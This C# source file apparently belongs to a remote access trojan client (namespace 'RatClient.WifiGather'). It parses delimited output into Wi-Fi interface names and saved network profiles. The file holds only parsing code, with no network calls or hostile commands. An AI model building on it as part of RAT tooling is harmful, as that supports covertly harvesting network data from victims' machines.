using System.Collections.Generic;


namespace RatClient.WifiGather
{

	internal class WifiStringInfoParser
	{
		private const string PROFILE_INFO = ":c7c73551973e970c26beb4f1f8a70e07:";
		private const string INTERFACE_NAME = ":7098753bf5e79cf50663c63d44df05a2:";
		private const string END_OF_RESULT = "a82d9bf5b36179d9d7a0078914a2a29f";

		public List<string> InterfacesName;
		public List<List<string>> ProfilesList;
		private string wifiInfoResult;
		private bool _status = true;
		private bool PARSED = false;

		public bool Status { get { return _status; } }

		public WifiStringInfoParser(string wifiInfoResult)
		{
			this.wifiInfoResult = wifiInfoResult;
			this.InterfacesName = new List<string>();
			this.ProfilesList = new List<List<string>>();
		}

		private string findIndex(string filter)
		{
			int start = wifiInfoResult.IndexOf(filter);
			if (start == -1)
			{
				return END_OF_RESULT;
			}

			int end = start + filter.Length;
			string subInfo = wifiInfoResult.Substring(end);
			int nextstart = subInfo.IndexOf(filter);
			if (nextstart == -1)
			{
				return END_OF_RESULT;
			}

			string index = subInfo.Substring(0, nextstart);
			wifiInfoResult = subInfo.Substring(nextstart + filter.Length);
			return index.Trim();
		}


		public void parse()
		{
			if (PARSED)
			{
				return;
			}
			PARSED = true;
			while (wifiInfoResult.Length > 0)
			{
				int lastLen = wifiInfoResult.Length;
				string profile;
				List<string> profiles = new List<string>();
				string interfaceName = findIndex(INTERFACE_NAME);

				while ((profile = findIndex(PROFILE_INFO)) != END_OF_RESULT)
				{
					profiles.Add(profile);
				}

				if (profiles.Count > 0)
				{
					ProfilesList.Add(profiles);
					InterfacesName.Add(interfaceName);
				}

				if (wifiInfoResult.Length >= lastLen)
				{
					_status = false;
					break;
				}
			}
		}

		public Dictionary<string, string[]> ToDict()
		{
			if (!PARSED)
			{
				parse();
			}
			Dictionary<string, string[]> res = new Dictionary<string, string[]>();
			for (int i = 0; i < InterfacesName.Count; i++)
			{
				res.Add(InterfacesName[i], ProfilesList[i].ToArray());
			}
			return res;
		}
		public List<(string, List<string>)> ToTupleList()
		{
			if (!PARSED)
			{
				parse();
			}
			var res = new List<(string, List<string>)>();
			for (int i = 0; i < InterfacesName.Count; i++)
			{
				res.Add((InterfacesName[i], ProfilesList[i]));
			}
			return res;
		}
	}
}
